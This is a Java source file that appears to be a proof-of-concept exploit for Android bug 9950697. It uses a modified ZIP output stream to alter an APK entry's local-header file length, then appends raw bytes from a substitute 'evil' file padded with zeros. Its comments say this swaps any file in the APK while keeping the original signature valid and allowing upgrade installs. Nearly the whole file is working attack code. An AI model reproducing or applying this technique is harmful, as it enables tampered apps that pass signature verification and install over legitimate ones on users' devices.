package com.wujinliang;

import org.apache.commons.compress.archivers.zip.ModdedZipArchiveOutputStream;
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.utils.IOUtils;

import java.io.*;
import java.util.zip.ZipEntry;

/**
 * <p>android BUG:9950697</p>
 * <p>通过修改local header的file length来达到替换apk的任何文件，而不影响android的原始签名及正常覆盖安装</p>
 *
 * @author wujinliang
 * @since 3/13/14
 */
public class ModdedZipEntryTest {
    public static void main(String[] args) {
        File dir = new File("/tmp/origin_apk_unzip_folder");
        File output = new File("/tmp/exploit.apk");
        if (output.exists()) output.delete();
        File evilFile = new File("/tmp/modded_files/tabbar_recommend.png");

        ModdedZipArchiveOutputStream zaos = null;
        try {
            zaos = new ModdedZipArchiveOutputStream(output);
            pack(dir, dir, zaos, evilFile);
            zaos.finish();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            IOUtils.closeQuietly(zaos);
        }
    }

    private static void pack(File dir, File root, ModdedZipArchiveOutputStream zaos, File evilFile) throws IOException {
        File[] files = dir.listFiles();
        // Empty directory
        if (files.length == 0) {
            zaos.putArchiveEntry(new ZipArchiveEntry(purge(dir, root) + "/"));
            zaos.closeArchiveEntry();
            return;
        }
        for (File file : files) {
            if (file.isDirectory()) {
                pack(file, root, zaos, evilFile);
            } else {
                File modded = null;
                if (file.getName().equals(evilFile.getName())) {
                    // 说明要替换了
                    modded = evilFile;
                }
                ZipArchiveEntry entry = new ZipArchiveEntry(file, purge(file, root));
                entry.setMethod(ZipEntry.STORED);
                zaos.putArchiveEntry(entry, modded);
                try {
                    writeZipFile(zaos, file, false);

                    //Writes all necessary data for this entry.
                    zaos.closeArchiveEntry();
                    if (modded != null) {
                        byte[] bytes = IOUtils.toByteArray(new FileInputStream(modded));
                        int length = bytes.length;
                        zaos.writeRaw(bytes, 0, length);
                        byte[] b = new byte[1];
                        b[0] = 0;
                        for(int i = 0; i < file.length() - length; i++) {
                            zaos.writeRaw(b, 0, 1);
                        }
                    }
                }catch(Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }

    private static void writeZipFile(ModdedZipArchiveOutputStream zaos, File file, boolean modded) {
        if (file == null) return;
        InputStream is = null;
        try {
            is = new BufferedInputStream(new FileInputStream(file));
            byte[] buffer = new byte[1024 * 5];
            int len = -1;
            while((len = is.read(buffer)) != -1) {
                //把缓冲区的字节写入到ZipArchiveEntry
                zaos.write(buffer, 0, len);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            IOUtils.closeQuietly(is);
        }
    }

    private static String purge(File file, File root) {
        return file.toString().substring(root.toString().length() + 1).replace('\\', '/');
    }
}
